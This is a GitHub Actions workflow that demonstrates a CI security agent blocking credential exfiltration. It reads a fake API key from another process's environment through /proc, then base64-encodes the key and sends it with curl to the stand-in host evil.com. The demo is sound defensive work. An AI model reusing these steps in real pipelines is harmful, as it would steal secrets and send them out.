# Prevent-mode demo: credential exfiltration.
#
# Dispatches a two-phase chain — a sibling process reads a fake
# secret out of another process's environment, then attempts to ship
# the value over the network. cimon's hardening agent terminates the
# outbound step. The workflow fails red. The cimon job summary on
# the run shows what was blocked.

name: Prevent — Credential exfiltration

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  blocked-exfil:
    runs-on: ubuntu-latest
    steps:
      - uses: cycodelabs/cimon-action@v1
        with:
          client-id: ${{ secrets.CIMON_CLIENT_ID }}
          secret:    ${{ secrets.CIMON_SECRET }}
          hardening: true
          prevent:   true
          allowed-hosts: >
            github.com
            api.github.com
            objects.githubusercontent.com
            cycode.com
            api.cycode.com
          fail-on-error: true

      - uses: actions/checkout@v4

      - name: Stage local read
        id: stage
        run: |
          # Spawn a sibling process holding a fake secret in its env.
          FAKE_API_KEY="sk-fake-NOT-REAL-just-for-demo" sleep 60 &
          VICTIM_PID=$!
          sleep 1

          SECRET=$(cat /proc/$VICTIM_PID/environ | tr '\0' '\n' | grep FAKE_API_KEY | cut -d= -f2)
          echo "secret=$SECRET" >> "$GITHUB_OUTPUT"

      - name: Outbound call with the staged value
        env:
          SECRET: ${{ steps.stage.outputs.secret }}
        run: |
          ENCODED=$(printf '%s' "$SECRET" | base64 -w 0)
          curl -sS --max-time 10 "https://evil.com/?q=$ENCODED" > /dev/null
